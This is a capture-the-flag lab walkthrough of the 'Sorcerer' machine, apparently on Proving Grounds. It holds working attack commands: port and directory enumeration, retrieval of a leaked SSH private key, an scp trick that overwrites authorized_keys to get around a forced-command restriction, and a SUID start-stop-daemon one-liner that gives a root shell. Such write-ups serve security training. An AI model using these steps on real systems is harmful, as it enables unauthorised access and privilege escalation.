First Enumeration with nmap

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v <IP> -Pn`

```
# Nmap 7.93 scan initiated Wed Jan  4 21:12:11 2023 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.59.100
Increasing send delay for 192.168.59.100 from 0 to 5 due to 18 out of 58 dropped probes since last increase.
Increasing send delay for 192.168.59.100 from 5 to 10 due to 11 out of 26 dropped probes since last increase.
Increasing send delay for 192.168.59.100 from 10 to 20 due to 11 out of 29 dropped probes since last increase.
Increasing send delay for 192.168.59.100 from 80 to 160 due to 11 out of 22 dropped probes since last increase.
Warning: 192.168.59.100 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.59.100
Host is up (0.25s latency).
Not shown: 40736 closed tcp ports (conn-refused), 24792 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
7742/tcp  open  msss
8080/tcp  open  http-proxy

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jan  4 21:13:58 2023 -- 1 IP address (1 host up) scanned in 106.67 seconds
```

Cool we got some ports available, let's run default nmap scripts to know what service are running on those ports 

`nmap -sC -sV -oN normal.tcp -p 22,80,111,2049,7742,8080 -Pn <IP>`

```
# Nmap 7.93 scan initiated Wed Jan  4 21:17:52 2023 as: nmap -sC -sV -oN normal.tcp -p 22,80,111,2049,7742,8080 -Pn 192.168.59.100
Nmap scan report for 192.168.59.100                                                
Host is up (0.54s latency).
                                                                                   
PORT     STATE SERVICE VERSION                                                     
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:              
|   2048 812a4224b590a1ce9bace74e1d6db4c6 (RSA)     
|   256 d0732a05527f89093776e356c8ab2099 (ECDSA)
|_  256 3a2dde33b01ef2350f8dc8d78ff9e00e (ED25519)
80/tcp   open  http    nginx                                                       
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind 2-4 (RPC #100000)                                           
| rpcinfo:                            
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs                                             
|   100003  3,4         2049/tcp   nfs                                             
|   100005  1,2,3      42865/tcp   mountd 
|   100005  1,2,3      43373/udp   mountd 
|   100021  1,3,4      39859/tcp   nlockmgr
|   100021  1,3,4      43044/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
7742/tcp open  http    nginx     
|_http-title: SORCERER                                                             
8080/tcp open  http    Apache Tomcat 7.0.4             
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.4                                                                                                                                      
|_http-open-proxy: Proxy might be redirecting requests                                                                                                                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                                                   
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan  4 21:18:28 2023 -- 1 IP address (1 host up) scanned in 35.89 seconds
```

cool we now know what services are running on those ports. Let's start by enumerating port 111 (RPC) nfs.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Sorcerer]
└─$ showmount -e 192.168.218.100
Export list for 192.168.218.100:
```

checked the nfs service to see if we can get any nfs share. Next let's enumerate port 7742.

![image](https://user-images.githubusercontent.com/87468669/210656162-af773d21-753f-4495-9d24-ad6cd0a5e4bd.png)

We got a login page, i tried many bypass auth payload, no worked. Let's burst hiddn directories.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Sorcerer]
└─$ ffuf -u "http://192.168.218.100:7742/FUZZ" -w /usr/share/wordlists/dirb/common.txt -fc 403,500 -fs 0,5 -e .txt,.php,.xml,.bak -r 
                                                                                                                                                                       
        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/                 
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                               
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/       
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/                 
                                         
       v1.5.0 Kali Exclusive <3
________________________________________________        
                                                                                   
 :: Method           : GET                                                         
 :: URL              : http://192.168.218.100:7742/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .txt .php .xml .bak           
 :: Follow redirects : true                                                        
 :: Calibration      : false
 :: Timeout          : 10             
 :: Threads          : 40                                                          
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403,500
 :: Filter           : Response size: 0,5                     
________________________________________________                        
                                                                                   
                        [Status: 200, Size: 1219, Words: 130, Lines: 65, Duration: 168ms]
default                 [Status: 200, Size: 14, Words: 3, Lines: 2, Duration: 174ms]
index.html              [Status: 200, Size: 1219, Words: 130, Lines: 65, Duration: 198ms]
zipfiles                [Status: 200, Size: 626, Words: 246, Lines: 11, Duration: 152ms]
:: Progress: [23070/23070] :: Job [1/1] :: 229 req/sec :: Duration: [0:02:40] :: Errors: 0 ::
```

Cool we got hidden directories, let's check the /zipfiles dir.

![image](https://user-images.githubusercontent.com/87468669/210656996-63938c3b-39a6-4318-9e3a-63e6d171f830.png)

We got some zip files, let's download max zip file cause it's size is larger than the rest.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Sorcerer]
└─$ wget http://192.168.218.100:7742/zipfiles/max.zip                                
--2023-01-04 22:58:09--  http://192.168.218.100:7742/zipfiles/max.zip
Connecting to 192.168.218.100:7742... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8274 (8.1K) [application/zip]
Saving to: ‘max.zip’

max.zip                                   100%[====================================================================================>]   8.08K  --.-KB/s    in 0.006s  

2023-01-04 22:58:09 (1.23 MB/s) - ‘max.zip’ saved [8274/8274]

                                                                                                                                                   
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Sorcerer]
└─$ unzip max.zip
Archive:  max.zip
   creating: home/max/
  inflating: home/max/.bash_logout   
  inflating: home/max/.profile       
   creating: home/max/.ssh/
  inflating: home/max/.ssh/id_rsa.pub  
  inflating: home/max/.ssh/authorized_keys  
  inflating: home/max/.ssh/id_rsa    
  inflating: home/max/tomcat-users.xml.bak  
  inflating: home/max/.bashrc        
  inflating: home/max/scp_wrapper.sh  
                                                                                                                                                     
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Sorcerer]
└─$ 
```

now we've downloaded and extracted the content, as we can s abov we have an id_rsa key... Great seems that's our way in.

![image](https://user-images.githubusercontent.com/87468669/210659179-de4e8511-f734-47e4-83c4-401613aaffbb.png)

tried to ssh into the box as user max with the id_rsa key file, and i got permission denied. let's read the content of the authorized key.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/Sorcerer/home/max/.ssh]
└─$ cat authorized_keys
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer        
```

oops we are being blocked by this authorized key. Let check the content of `scp_wrapper.sh` file in max dir.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/PGP/Sorcerer/home/max]
└─$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac 
```

we can see that we are only allowed to run scp, but we wont get a pty-shell. let's abuse this.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/PGP/Sorcerer/home/max]
└─$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmJvfGwWsunxV1J1gwidNwJfmjvCK9sWIlXib/tgkyrjj9nqia7SLVIbX0osNN1BnI1sVe1MieTrLa5CjGxgW9ksv90Rr5kExw7OAWVXhX59g+3sR9Y55WXNqd+eQWT8cCkGCglaOe5wDC7QvBeZleFS5lfjtrK8U8Moi3y6hLEUVPiAJJ9dSgKKJoZjoxrSAt7n9Xrnv51jyfPHZHwaY4bLXlNQ8rF7ijKYVeP2obh+lUqB9Px0++KwWlUb4u1OFN0xNXGkGcAq2c8Ddkk80knKW4Ps+DxI7bXlRFMQDrTqYMY/vrXU9O15zSg3mJ/V9KlEzS4bQd6DS1AgxQTqgKt0JPh5RTpFrr3WSdIdxdo8S41BRYiOp6SfqKxqGyN9kjtS6IIXM6HQUgfuFhYnMaDubXBTndtZh30UbD3H2IXQ5iFrnde/V+fNDg8PqW6HKZZewllk5AthZnuzPpZnWSSfD164XJeLle+4CSvV4DxDWObk6/GxJN7UaMyGsOonE= max@sorcerer
```

first we generate a new authorized_keys, the we use scp to replace the main authorized_keys in main server with this.

```
scp -O -i id_rsa -r authorized_keys max@192.168.218.100:/home/max/.ssh/authorized_keys
```

![image](https://user-images.githubusercontent.com/87468669/210662413-716114ab-a041-4751-b3d9-3b518dc57a41.png)

now let's login our own id_rsa key not the one we got from max zip file cause we replace the authorized_keys file with our local auth_keys.

![image](https://user-images.githubusercontent.com/87468669/210662778-18d25ffc-8211-4a45-b489-f72dc7ca88b7.png)

And Boom! we are in, let's escalate privs.

```
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```
![image](https://user-images.githubusercontent.com/87468669/210663334-813a6470-7473-4933-b910-2d8ca3ff139c.png)

checked for suid, found out that `/usr/sbin/start-stop-daemon` is an suid, abused it an got root. 

And we are done!!!🤠


